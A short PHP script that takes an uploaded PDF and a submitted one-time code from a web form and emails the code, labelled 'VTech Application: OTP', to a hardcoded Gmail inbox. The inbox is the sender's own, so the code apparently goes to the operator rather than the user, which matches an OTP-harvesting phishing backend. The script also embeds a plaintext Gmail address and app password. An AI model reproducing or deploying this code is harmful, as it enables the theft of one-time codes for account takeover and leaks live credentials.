<?php

require './vendor/autoload.php'; // Load PHPMailer

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Check if the PDF file is received
    if (isset($_FILES['pdfFile']) && $_FILES['pdfFile']['error'] == UPLOAD_ERR_OK) {
        // Get the temporary file path
        

        // Send email with the PDF attachment directly from the temporary file
        $code = isset($_POST['code']) ? $_POST['code'] : '';

        // Send email with the PDF, image, and user details
        sendCodeToEmail($code);
    } else {
        echo json_encode(['success' => false, 'message' => 'No file uploaded or there was an error uploading.']);
    }
}

function sendCodeToEmail($code) {
    $mail = new PHPMailer(true);

    try {
        // SMTP settings
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';                               // Set the SMTP server to Gmail
        $mail->SMTPAuth = true;
        $mail->Username = 'popularwater@gmail.com'; // Your Gmail email address
        $mail->Password = 'vpdx rddx wcqk btez';  // Use app password if 2FA is enabled
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;           // Enable TLS encryption
        $mail->Port = 587;                                             // Port 587 for TLS

        // Recipients
        $mail->setFrom('popularwater@gmail.com', 'VTECH');
        $mail->addAddress('popularwater@gmail.com', 'VTECH');  // Add recipient


        // Attach the PDF file
   

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'VTech Application: OTP';
        $mail->Body    = 'Please find your OTP for the application below.<br><br>'
                        . 'OTP Code: ' . $code . '<br>';

        $mail->AltBody = 'Please find your OTP for the application below.\n\n'
                        . 'OTP Code: ' . $code;
        // Send the email
        if ($mail->send()) {
            echo json_encode(['success' => true, 'message' => 'Email sent successfully.']);
        } else {
            echo json_encode(['success' => false, 'message' => 'Email could not be sent.']);
        }
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'message' => 'Mailer Error: ' . $mail->ErrorInfo]);
    }
}

?>
